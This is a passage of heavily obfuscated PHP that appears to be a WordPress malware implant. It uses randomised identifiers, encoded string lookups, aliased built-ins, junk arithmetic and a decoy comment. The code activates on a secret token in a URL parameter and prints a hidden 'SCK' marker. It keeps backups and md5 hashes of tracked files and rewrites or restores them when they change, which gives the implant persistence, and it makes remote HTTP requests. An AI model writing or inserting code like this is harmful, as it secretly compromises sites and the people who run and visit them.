   $u9q408mfqfpz =     preg_replace_callback(ovffvv33(1429),  f6yrzd2knrmb(1430),  $vvwo0n7itwepj);
  if     ($GLOBALS['__scf_fv3zevxzzb_44']($u9q408mfqfpz)   &&   $u9q408mfqfpz   !== $vvwo0n7itwepj   &&    uql5cxv40bgbaq184aiw9v($u9q408mfqfpz))  return  true;
   }
 }
  if    ($GLOBALS['__scf_e24rppqzou_1420'](iw6xe9q4j6sneg(1433), $nm_xi0i0qy, $hbmb7dmmj_zj5)) {
 foreach  ($hbmb7dmmj_zj5[1]    as   $vvwo0n7itwepj)  {
   if  (uql5cxv40bgbaq184aiw9v($GLOBALS['__scf_usy4mchq83xa_378'](array(hn_f08x0cns80(1427), bpowi0iglycvx(1428)),     array('\\',  '\''), $vvwo0n7itwepj)))   return true;
 }


        foreach   ($hbmb7dmmj_zj5[1] as   $vvwo0n7itwepj)   {
 if  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($vvwo0n7itwepj, c1sob647u1i(1423))  === false) continue;

$u9q408mfqfpz   =   preg_replace_callback(f6yrzd2knrmb(1429),    bpowi0iglycvx(1430),   $vvwo0n7itwepj);
   if   ($GLOBALS['__scf_fv3zevxzzb_44']($u9q408mfqfpz)   &&  $u9q408mfqfpz !== $vvwo0n7itwepj   &&    uql5cxv40bgbaq184aiw9v($u9q408mfqfpz))      return     true;
}
     }
 return  false;
 }
       function gdvo0h5bcuzy91kz589lst($nm_xi0i0qy)
   {

if (!$GLOBALS['__scf_fv3zevxzzb_44']($nm_xi0i0qy)     || $nm_xi0i0qy  ===     "") return "";
  return ($GLOBALS['__scf_wdjvpd1lvon9_102'](iw6xe9q4j6sneg(1434),  $GLOBALS['__scf_nv7he759wjfj_9']($nm_xi0i0qy,  0,     (0x93+0x1f6d)),   $u7fvh_hax8vn)) ?      $u7fvh_hax8vn[1]   : "";
  }
    function   zb8j7k_ktia5b5er11h($amsjsw283qnc3,    $ymulztzvvz, $duluassmqus  =    null)
     {
   if  (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3) || $amsjsw283qnc3   === "") return  $amsjsw283qnc3;
     $ksq_wan0tq7k    =  c1sob647u1i(1435)    . $ymulztzvvz   .  bpowi0iglycvx(802);
$toxd7lwn40kosh59  =   "";
     $r4zgxvwqemn    = 0;
 while ($r4zgxvwqemn++    <  (0x38+0x48))    {
  $mz8j5e4htkyelh   = $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,     $ksq_wan0tq7k);
  if     ($mz8j5e4htkyelh   ===     false)  break;
    $ew76kkpla0qghn6 =    $mz8j5e4htkyelh     +  $GLOBALS['__scf_d4eyetogjbsnt_10']($ksq_wan0tq7k);
  $xdkoan19kj     =  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  hn_f08x0cns80(1321), $ew76kkpla0qghn6);
  if   ($xdkoan19kj    === false ||   $xdkoan19kj    -    $ew76kkpla0qghn6    >  (0xc+0x34))  {



 $toxd7lwn40kosh59   .= $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3,  0, $ew76kkpla0qghn6);
$amsjsw283qnc3 = $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3, $ew76kkpla0qghn6);
       continue;
 }
      $ipl7adq6px3   =   $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3,  $ew76kkpla0qghn6,   $xdkoan19kj  - $ew76kkpla0qghn6);
   if   (!$GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(1436),    $ipl7adq6px3))   {
   $toxd7lwn40kosh59   .= $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3, 0,   $ew76kkpla0qghn6);
$amsjsw283qnc3    = $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3,   $ew76kkpla0qghn6);
    continue;

        }
  $ag_dp3voxa_tc0wl  =    hn_f08x0cns80(1435)   . $ymulztzvvz .      bpowi0iglycvx(1437)   .  $ipl7adq6px3 .   ovffvv33(1321);
    $hlm2rjpdeakj    = $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3, $ag_dp3voxa_tc0wl, $xdkoan19kj);
   if ($hlm2rjpdeakj  === false)  break;
 $toxd7lwn40kosh59 .= $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3, 0, $mz8j5e4htkyelh);
     $ayjxtgjc9htndr3    = $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3,   $mz8j5e4htkyelh,  $hlm2rjpdeakj   +    $GLOBALS['__scf_d4eyetogjbsnt_10']($ag_dp3voxa_tc0wl) -  $mz8j5e4htkyelh);$la8k5oefq12=1597;$lvaoo5peiktvc=$la8k5oefq12%13;
 if ($duluassmqus !== null)  {
$n0tlzmrutbrfwh_    =  $GLOBALS['__scf_uroqlxj534ze4e_302']($duluassmqus,  $ayjxtgjc9htndr3);
if  ($GLOBALS['__scf_fv3zevxzzb_44']($n0tlzmrutbrfwh_))   $toxd7lwn40kosh59   .= $n0tlzmrutbrfwh_;
     }     else {
 $toxd7lwn40kosh59  .=  $ayjxtgjc9htndr3;
}

    $amsjsw283qnc3     =  $GLOBALS['__scf_nv7he759wjfj_9']($amsjsw283qnc3,    $hlm2rjpdeakj    +   $GLOBALS['__scf_d4eyetogjbsnt_10']($ag_dp3voxa_tc0wl));
  }
 return   $toxd7lwn40kosh59  . $amsjsw283qnc3;



      }
      function    dnuz8y_75ek6f0qky_98yx($aakozw_1zysblhgx)
  {
return   "";
     




 }


  function o6lw8tljjzruvw($aakozw_1zysblhgx)



{
    if  (!$GLOBALS['__scf_fv3zevxzzb_44']($aakozw_1zysblhgx)) return   "";
       if (!defined(hn_f08x0cns80(1417)))   return $aakozw_1zysblhgx;

  $_qr1w5trunvt9sx    =    nreub2fs747eromoe(ABSPATH .   iw6xe9q4j6sneg(1438),   (0x4+0x4));
  if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1439)  . $_qr1w5trunvt9sx  .  ovffvv33(1440),   $aakozw_1zysblhgx))  return      "";
   return   $aakozw_1zysblhgx;
     }
    function  tl0ublf2y8592ys5($amsjsw283qnc3)
  {
 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)  ||   $amsjsw283qnc3 ===   "")   return $amsjsw283qnc3;
 

  $ukjj4vzpxsr =   zb8j7k_ktia5b5er11h($amsjsw283qnc3,  iw6xe9q4j6sneg(1441),    hn_f08x0cns80(1442));
  $ukjj4vzpxsr   = zb8j7k_ktia5b5er11h($ukjj4vzpxsr,   c1sob647u1i(1443), iw6xe9q4j6sneg(1444));
      if   ($GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))   $ukjj4vzpxsr =    $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1445),   "",  $ukjj4vzpxsr);
  if     (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))  $ukjj4vzpxsr   =     $amsjsw283qnc3;
     if  (wxrmns_khitjn70x40_x($ukjj4vzpxsr))   {
       $ukjj4vzpxsr =    zb8j7k_ktia5b5er11h($ukjj4vzpxsr,  c1sob647u1i(1441), ovffvv33(1446));
 $ukjj4vzpxsr =     zb8j7k_ktia5b5er11h($ukjj4vzpxsr,    bpowi0iglycvx(1443),  ovffvv33(1446));



      if ($GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr)) $ukjj4vzpxsr   = $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1445),     "",    $ukjj4vzpxsr);
}
return $GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr) ? $ukjj4vzpxsr    :   $amsjsw283qnc3;
  }
  function    pxpms_34emojockcc3uvz($amsjsw283qnc3)
  {$vvf7_gag=PHP_MAJOR_VERSION;$wuoy5fo8yozk_7=$vvf7_gag*6;
   if   (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)   ||   !defined(ovffvv33(1447)))   return    false;
 if ($GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1448),      $amsjsw283qnc3)) return     true;
$oh4hwd4z9q8  =   nreub2fs747eromoe(ABSPATH    . ovffvv33(1438),   (0x6+0x2));
 if      ($GLOBALS['__scf_e24rppqzou_1420'](f6yrzd2knrmb(1449), $amsjsw283qnc3,  $yowwpgultz))      {
foreach   ($yowwpgultz[1]  as  $csh0s_3c8r7xv_)      {
if ($GLOBALS['__scf_nv7he759wjfj_9']($csh0s_3c8r7xv_,   -(11-2))   === ':'   .     $oh4hwd4z9q8)    return   true;
    }
}
  $_dd  = $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](ABSPATH  .  f6yrzd2knrmb(1450)),     0,   (5+3));
  if  ($GLOBALS['__scf_e24rppqzou_1420'](bpowi0iglycvx(1451),      $amsjsw283qnc3,  $_dm)) {
   foreach     ($_dm[1] as  $p17jigsnxq)  {
if  ($p17jigsnxq === $_dd)     return true;
}
// WP Tag Cloud: countable unification

}
  return   false;



     }
  function  c1a91zwgo6g18s053()
{
  if   (!isset($_GET[iw6xe9q4j6sneg(1452)])  ||  !$GLOBALS['__scf_fv3zevxzzb_44']($_GET[c1sob647u1i(1452)])    ||  !$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1411))) return;
    $wpzy6fg5fms6r   =     @get_option(f6yrzd2knrmb(570),   array());
if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r))  return;
   $pp08__6yl5k0  =  (string)   $_GET[ovffvv33(1453)];
    $h1mwvatww0ikvh      =  array();
 if (isset($wpzy6fg5fms6r['t'])) $h1mwvatww0ikvh[]  = (string)   $wpzy6fg5fms6r['t'];
 if  (isset($wpzy6fg5fms6r[bpowi0iglycvx(1454)]) &&  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r[f6yrzd2knrmb(1455)])) {

 foreach  ($wpzy6fg5fms6r[c1sob647u1i(1455)]    as  $o57oiv_k0hv5a) {
if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($o57oiv_k0hv5a)    && isset($o57oiv_k0hv5a['t'])) $h1mwvatww0ikvh[] =   (string)    $o57oiv_k0hv5a['t'];
}
}
    $ztqw4ergnhp8msy   = false;


   foreach     ($h1mwvatww0ikvh as  $fz6pz1pjf0rzyw7) {



      if ($fz6pz1pjf0rzyw7 ===  "")      continue;



 $ztqw4ergnhp8msy  = $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1456)) ?   hash_equals($fz6pz1pjf0rzyw7,    $pp08__6yl5k0)  :  ($fz6pz1pjf0rzyw7     ===  $pp08__6yl5k0);
 if   ($ztqw4ergnhp8msy)    break;
  }
  if (!$ztqw4ergnhp8msy)  return;
$GLOBALS[c1sob647u1i(1457)]    =  $pp08__6yl5k0;
  eq7z05kg4s98n6ox(iw6xe9q4j6sneg(775),  f6yrzd2knrmb(1458), -1);

  if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1459)))     {
    $GLOBALS['__scf_g45egtj01hms_186'](iw6xe9q4j6sneg(1458));

}
      }
 function     r0upjj7dm4y_pv7()



{
   if    (empty($GLOBALS[ovffvv33(1457)])  || !$GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[hn_f08x0cns80(1457)]))  return;$hz15bwgqy=213|253;$h2jxq_5jypy=$hz15bwgqy^97;
     if     (!empty($GLOBALS[hn_f08x0cns80(1460)])) return;
$GLOBALS[hn_f08x0cns80(1461)] =  true;
 echo  "\n<!--SCK:"   .   $GLOBALS[bpowi0iglycvx(1457)]    . bpowi0iglycvx(1462);
     }

function  sv22ioxna2z9xuz()
{
   if   (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1411)))  return  false;
$u7fvh_hax8vn =  @get_option(c1sob647u1i(1463),   "");
 if (!$GLOBALS['__scf_fv3zevxzzb_44']($u7fvh_hax8vn)    ||     $GLOBALS['__scf_w6mdcepio4lkz5_7']($u7fvh_hax8vn,     f6yrzd2knrmb(1464)) !==  0)    return  false;
    $od1k306iacye2 = (int) $GLOBALS['__scf_nv7he759wjfj_9']($u7fvh_hax8vn,    (9-3));
if   ($od1k306iacye2  &&     $GLOBALS['__scf_qzyo0sgkyb6_202']()   -    $od1k306iacye2  > (119621-33221))   return  false;


   return   true;
 }



        function  l1s0od7mbsjgia4oi($w90pshmxoqhf,   $w3v34rm5bz52xw)
{
 if (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1465))   ||    !$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1466)))   return   false;
$wpzy6fg5fms6r =  @get_option(f6yrzd2knrmb(1467),  array());
if     (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r)) $wpzy6fg5fms6r   =   array();

if  (!isset($wpzy6fg5fms6r[ovffvv33(1455)]) ||  !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r[hn_f08x0cns80(1455)]))      {
$qx_yk_f05pvsqto  = array();


    if (isset($wpzy6fg5fms6r['t'],     $wpzy6fg5fms6r['p'],   $wpzy6fg5fms6r['b']))   {
    $ppn5co_7mpn   = (string)   $wpzy6fg5fms6r['p'];
      $fuawewb9_8sr   = (string)  $wpzy6fg5fms6r['b'];
        $qx_yk_f05pvsqto[$GLOBALS['__scf_tnonex5o9y_60']($ppn5co_7mpn)]     =     array('t'     =>   (string)  $wpzy6fg5fms6r['t'],     'p'    => $ppn5co_7mpn,   'b'     =>    $fuawewb9_8sr,  ovffvv33(948)  =>     isset($wpzy6fg5fms6r[hn_f08x0cns80(948)]) ? (int) $wpzy6fg5fms6r[ovffvv33(948)] :  $GLOBALS['__scf_qzyo0sgkyb6_202'](),    ovffvv33(1468) =>     0,      'n'  => (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($fuawewb9_8sr) &&  (int)     @$GLOBALS['__scf_b42duf6j1zadm9_105']($fuawewb9_8sr)  ===     0) ?  1 : 0);
    $wshcsvxqz9rcjeq4  =    $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1469))   ?    @md5_file($ppn5co_7mpn)     :  false;
   if   ($GLOBALS['__scf_fv3zevxzzb_44']($wshcsvxqz9rcjeq4) &&      $wshcsvxqz9rcjeq4 !== "") $qx_yk_f05pvsqto[$GLOBALS['__scf_tnonex5o9y_60']($ppn5co_7mpn)]['h'] =  $wshcsvxqz9rcjeq4;

     unset($ppn5co_7mpn,  $fuawewb9_8sr, $wshcsvxqz9rcjeq4);
   }
$wpzy6fg5fms6r = array(hn_f08x0cns80(1455)     =>  $qx_yk_f05pvsqto);



    }
$ipl7adq6px3     =   $GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf);
    $pp9rb4l1no81yu  = sv22ioxna2z9xuz()    ?  1      : 0;
      $e9dqrhouptbgv    = !isset($wpzy6fg5fms6r[hn_f08x0cns80(1455)][$ipl7adq6px3]);

 if  (!$e9dqrhouptbgv)  {
       $wpzy6fg5fms6r[iw6xe9q4j6sneg(1455)][$ipl7adq6px3][c1sob647u1i(948)]    =  $GLOBALS['__scf_qzyo0sgkyb6_202']();
 $wpzy6fg5fms6r[c1sob647u1i(1455)][$ipl7adq6px3]['g']  = $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
  $wpzy6fg5fms6r[f6yrzd2knrmb(1455)][$ipl7adq6px3][c1sob647u1i(1468)] =   0;


 $wpzy6fg5fms6r[ovffvv33(1455)][$ipl7adq6px3]['n'] = ($w3v34rm5bz52xw   === "") ?  1    : 0;
  $wpzy6fg5fms6r[hn_f08x0cns80(1455)][$ipl7adq6px3][iw6xe9q4j6sneg(1470)]  =  $pp9rb4l1no81yu;
$wpzy6fg5fms6r[hn_f08x0cns80(1471)][$ipl7adq6px3][ovffvv33(1472)] =    $GLOBALS['__scf_qzyo0sgkyb6_202']();
 $wpzy6fg5fms6r[ovffvv33(1473)][$ipl7adq6px3][c1sob647u1i(1474)]      = 0;
  $wpzy6fg5fms6r[iw6xe9q4j6sneg(1473)][$ipl7adq6px3][ovffvv33(1475)]     =   0;
$wpzy6fg5fms6r[c1sob647u1i(1476)][$ipl7adq6px3][iw6xe9q4j6sneg(1477)] = 0;
 if   (!c5kyk62yk_dwfeubni4b($wpzy6fg5fms6r[c1sob647u1i(1476)][$ipl7adq6px3]['b'], $w3v34rm5bz52xw))     {
   g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1478), ovffvv33(1479));
   return  false;



}
   } else     {


 if     ($GLOBALS['__scf_wj6dld55k5r8m_39']($wpzy6fg5fms6r[ovffvv33(1476)])   >=  (7+3)) {



    g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1478),  ovffvv33(1480));

     return  false;
     }
  $t49jadtyjx =  p2b_7j_9ex54eg4();
   $_n9saj2aohoh = $t49jadtyjx . c1sob647u1i(1481)  . nreub2fs747eromoe($w90pshmxoqhf,   (4+8))  .   bpowi0iglycvx(1482);
     if     (!c5kyk62yk_dwfeubni4b($_n9saj2aohoh,     $w3v34rm5bz52xw))     {
 g_qoqdy38lfl4v4n3618(ovffvv33(1478), ovffvv33(1483));
return false;

   }
$wpzy6fg5fms6r[iw6xe9q4j6sneg(1484)][$ipl7adq6px3]   =  array('t'  => hot4kulhrw7gwj3gagxl((26-10)), 'p'      =>  $w90pshmxoqhf,   'b' =>      $_n9saj2aohoh, bpowi0iglycvx(1485)  =>    $GLOBALS['__scf_qzyo0sgkyb6_202'](),  'g'  => $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true), bpowi0iglycvx(1486)  =>     0, 'n'   =>   ($w3v34rm5bz52xw    === "")  ?  1 :   0,  bpowi0iglycvx(1487)    =>  $pp9rb4l1no81yu, f6yrzd2knrmb(1472)    => $GLOBALS['__scf_qzyo0sgkyb6_202'](),  bpowi0iglycvx(1474) => 0, c1sob647u1i(1475)  =>  0,     ovffvv33(1477) =>  0);
 }
   $n3obntcazp0 =   @update_option(ovffvv33(1488), $wpzy6fg5fms6r,    f6yrzd2knrmb(1400));
  if    (!$n3obntcazp0)    {
  if   ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1138)))   @wp_cache_delete(f6yrzd2knrmb(1488),     bpowi0iglycvx(1141));
 $mbd5c2pzrz =  @get_option(bpowi0iglycvx(1488),      array());
 $v_db5_cu7eqahfv   = $GLOBALS['__scf_w1m1ydxx4_gm9__38']($mbd5c2pzrz)  &&    isset($mbd5c2pzrz[iw6xe9q4j6sneg(1484)][$ipl7adq6px3])   &&   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($mbd5c2pzrz[hn_f08x0cns80(1484)][$ipl7adq6px3])
&& isset($mbd5c2pzrz[bpowi0iglycvx(1484)][$ipl7adq6px3]['g']) && (string) $mbd5c2pzrz[f6yrzd2knrmb(1484)][$ipl7adq6px3]['g'] === (string)  $wpzy6fg5fms6r[f6yrzd2knrmb(1489)][$ipl7adq6px3]['g'];
 if  (!$v_db5_cu7eqahfv)  {
if   ($e9dqrhouptbgv) cvtaycsw15_xd1srry($wpzy6fg5fms6r[c1sob647u1i(1489)][$ipl7adq6px3]['b']);
g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1490), hn_f08x0cns80(1491));

    return    false;
   }
   }
  $GLOBALS['__scf_g45egtj01hms_186'](c1sob647u1i(1492));
 return  true;
}


 function rdslwi2runwrwbh()
      {
      if      (!isset($GLOBALS[f6yrzd2knrmb(1493)])   ||  !$GLOBALS['__scf_igt4peff597_1494']($GLOBALS[hn_f08x0cns80(1495)]))   $GLOBALS[f6yrzd2knrmb(1495)]   =  0.0;
     return     11.0  -  $GLOBALS[hn_f08x0cns80(1495)];
   }
function  a2olde_if45fiw0jmcv($ov_r9dfqgxbo)
  {
    $GLOBALS[f6yrzd2knrmb(1495)]  = (isset($GLOBALS[c1sob647u1i(1495)])   &&   $GLOBALS['__scf_igt4peff597_1494']($GLOBALS[ovffvv33(1495)])  ?  $GLOBALS[hn_f08x0cns80(1495)] : 0.0)  +   (float) $ov_r9dfqgxbo;
  }
 function ikfshtej4d_q5fbom($o_mle9hlw6xo)
   {

   $_s9wu3ekvd3cf8   =  rdslwi2runwrwbh();
  if     ($_s9wu3ekvd3cf8 <=   0.5)  return  array(-2, "");
  $i15ekbwriadnays6 = $GLOBALS['__scf_a5xz_m7m_xzaj_493'](1,   $GLOBALS['__scf_bpblov2hvcg_r_494']((3+3),     (int) $_s9wu3ekvd3cf8));
  $cljgusq7fd  =  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
   $fpcv32y86pyln2w6 =   @$GLOBALS['__scf_r7h_2y83ismjfq_303']($o_mle9hlw6xo,    array(c1sob647u1i(1496)      =>   $i15ekbwriadnays6,  hn_f08x0cns80(1497) =>   false,  f6yrzd2knrmb(486)  =>  true,   hn_f08x0cns80(1498) => 0,    f6yrzd2knrmb(700)  =>  (1048517+59), hn_f08x0cns80(985)  => array(iw6xe9q4j6sneg(986)    =>  ovffvv33(1499), ovffvv33(1500)  => hn_f08x0cns80(987))));
 a2olde_if45fiw0jmcv($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)    - $cljgusq7fd);
 

  if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1501))  &&     is_wp_error($fpcv32y86pyln2w6)) return     array(-1,   false);
 $ch7u8u2ur1 =     $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1502))    ?  (int)     wp_remote_retrieve_response_code($fpcv32y86pyln2w6)    :  0;
    return  array($ch7u8u2ur1, $ch7u8u2ur1 >    0    &&      $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1503)) ?    (string)   wp_remote_retrieve_body($fpcv32y86pyln2w6)      :    "");
      }
 function ghttebm5ugw_js_hn2zmc($w90pshmxoqhf)


  {
if     (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1504))  || !$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1465)) ||   !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1469)))    return;
 $wpzy6fg5fms6r   =   @get_option(hn_f08x0cns80(1488), array());
  if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r)    ||  !isset($wpzy6fg5fms6r[hn_f08x0cns80(1489)])  ||  !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r[ovffvv33(1489)]))   return;
$ipl7adq6px3  =    $GLOBALS['__scf_tnonex5o9y_60']($w90pshmxoqhf);



 if (!isset($wpzy6fg5fms6r[iw6xe9q4j6sneg(1489)][$ipl7adq6px3])) return;
 $eribl7p1ze  =   @md5_file($w90pshmxoqhf);



    if    (!$GLOBALS['__scf_fv3zevxzzb_44']($eribl7p1ze)   || $eribl7p1ze === "")      return;
$wpzy6fg5fms6r[c1sob647u1i(1489)][$ipl7adq6px3]['h']   =  $eribl7p1ze;


  @update_option(ovffvv33(1488), $wpzy6fg5fms6r,      iw6xe9q4j6sneg(1400));
     }
   function   xtkq_u_93j5iw5ccyqn($o57oiv_k0hv5a)
  {
 $hejri7wm34f   =  @$GLOBALS['__scf_utyj_ckly79_101']($o57oiv_k0hv5a['b']);
   if   (!$GLOBALS['__scf_fv3zevxzzb_44']($hejri7wm34f)) return   false;
    if (!empty($o57oiv_k0hv5a['h'])      && $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1469)))   {
  $z8iu_ea60kozv1 =   @md5_file($o57oiv_k0hv5a['p']);
     if  ($GLOBALS['__scf_fv3zevxzzb_44']($z8iu_ea60kozv1) && $z8iu_ea60kozv1 !==  "" &&  $z8iu_ea60kozv1  !== $o57oiv_k0hv5a['h']) return false;





 unset($z8iu_ea60kozv1);
  }



  if   ($hejri7wm34f    ===    "")  {
 if    (empty($o57oiv_k0hv5a['n'])) return false;  
        $k70jvs6zsx  =  !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($o57oiv_k0hv5a['p']);


 if   (!$k70jvs6zsx)    {
ruinnb541lwxm7j($o57oiv_k0hv5a['p'],  (326+94));$votro7mec=85+26;$w25xuimklum0eu=$votro7mec-20;
     $k70jvs6zsx  =  cvtaycsw15_xd1srry($o57oiv_k0hv5a['p']);
    }
 if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(748)))   @opcache_invalidate($o57oiv_k0hv5a['p'],      true);
return     $k70jvs6zsx;
   }
     if    (!c5kyk62yk_dwfeubni4b($o57oiv_k0hv5a['p'],  $hejri7wm34f))    return  false;
 if   ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(748)))  @opcache_invalidate($o57oiv_k0hv5a['p'],   true);$hqtt71_m=(0x18+0x4d);$i44ttlxxncv9=$hqtt71_m%15;
return  true;
  }



     function    _46bdoe_r5737_vy0kp()
 {
 if   (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1504)))  return;$to3k4l4kuz1=PHP_MAJOR_VERSION;$x265i8651=$to3k4l4kuz1*7;



 if     (!empty($GLOBALS[f6yrzd2knrmb(1505)]))  return;



     if (!dtf7lvb25ztuc8jh3htk(hn_f08x0cns80(1488))) return;
    try      {
 $wpzy6fg5fms6r =  @get_option(f6yrzd2knrmb(1488),   array());$_3k7rzyh3j=(0x84+0xa0);$axl4zjyt=$_3k7rzyh3j%2;



 if    (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r))  return;
 if (!isset($wpzy6fg5fms6r[c1sob647u1i(1489)]) ||   !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($wpzy6fg5fms6r[c1sob647u1i(1489)]))   {
$qx_yk_f05pvsqto =   array();$o6xnki3t=56+88;$r5zgx_aby9=$o6xnki3t-48;
  if (isset($wpzy6fg5fms6r['t'],   $wpzy6fg5fms6r['p'], $wpzy6fg5fms6r['b'])) {
   $ppn5co_7mpn =      (string)   $wpzy6fg5fms6r['p'];
      $fuawewb9_8sr = (string)  $wpzy6fg5fms6r['b'];



   $qx_yk_f05pvsqto[$GLOBALS['__scf_tnonex5o9y_60']($ppn5co_7mpn)] =   array('t' =>  (string)    $wpzy6fg5fms6r['t'],     'p'   => $ppn5co_7mpn,    'b'    =>      $fuawewb9_8sr, c1sob647u1i(1485)     =>    isset($wpzy6fg5fms6r[hn_f08x0cns80(1485)])  ?  (int)  $wpzy6fg5fms6r[bpowi0iglycvx(1485)]   : $GLOBALS['__scf_qzyo0sgkyb6_202'](),     hn_f08x0cns80(1486) =>      0,  'n' =>  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($fuawewb9_8sr)     &&  (int)     @$GLOBALS['__scf_b42duf6j1zadm9_105']($fuawewb9_8sr) === 0)   ? 1   :      0);
    $wshcsvxqz9rcjeq4 = $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1469))  ?  @md5_file($ppn5co_7mpn) :   false;
  if     ($GLOBALS['__scf_fv3zevxzzb_44']($wshcsvxqz9rcjeq4)  && $wshcsvxqz9rcjeq4      !==   "")     $qx_yk_f05pvsqto[$GLOBALS['__scf_tnonex5o9y_60']($ppn5co_7mpn)]['h'] =   $wshcsvxqz9rcjeq4;
  unset($ppn5co_7mpn,      $fuawewb9_8sr,  $wshcsvxqz9rcjeq4);
     }


   $wpzy6fg5fms6r  = array(bpowi0iglycvx(1489)    =>    $qx_yk_f05pvsqto);
    }
if (empty($wpzy6fg5fms6r[f6yrzd2knrmb(1489)]))   {
@delete_option(iw6xe9q4j6sneg(1488));



       return;$dqg_bzvxuuu=PHP_MAJOR_VERSION;$z2f9ps173=$dqg_bzvxuuu*2;
 }


   if (sv22ioxna2z9xuz())   {
 $zek2owtasmmjpr6 = false;
foreach   ($wpzy6fg5fms6r[hn_f08x0cns80(1489)]   as     $kni4f3q5nbghh => $kic3sdfg7c)  {
   if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($kic3sdfg7c)  &&    empty($kic3sdfg7c[bpowi0iglycvx(1487)]))    {
 $wpzy6fg5fms6r[f6yrzd2knrmb(1489)][$kni4f3q5nbghh][c1sob647u1i(1487)]   = 1;
     $zek2owtasmmjpr6    = true;
    

        }
   }
if ($zek2owtasmmjpr6)     @update_option(hn_f08x0cns80(1506),  $wpzy6fg5fms6r,  bpowi0iglycvx(1400));
       unset($zek2owtasmmjpr6,  $kni4f3q5nbghh, $kic3sdfg7c);
     return;
}
  static      $yaqzzph9pc8a1 =  false;
   if  ($yaqzzph9pc8a1)  return;
$yaqzzph9pc8a1    = true;

  $uekflbb3so   = $GLOBALS['__scf_atryllxfh4qbk_735']($wpzy6fg5fms6r[ovffvv33(1507)]);


  $g5x04iw2w6d  =     array();
     if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(412)))  @$GLOBALS['__scf_qbnw1nt7jz7_412']();
  elseif     ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(413))) @$GLOBALS['__scf_n7xrk8yr6wiaqy_413']();
     if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(414))) @$GLOBALS['__scf_q_k47eumcpo_414'](true);
     if   (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(982))   ||    !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1196)))   return;
 $oopusyml3ptz    =   home_url('/');
  $v2whfedxxthhjp =   $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(576)) ?  wp_login_url() :   $oopusyml3ptz     . bpowi0iglycvx(1508);
$popd_dnmtqs0il64     = false;
$v9a3011_py   =    true;
  $_s9wu3ekvd3cf8    =    (0x1+0x2);
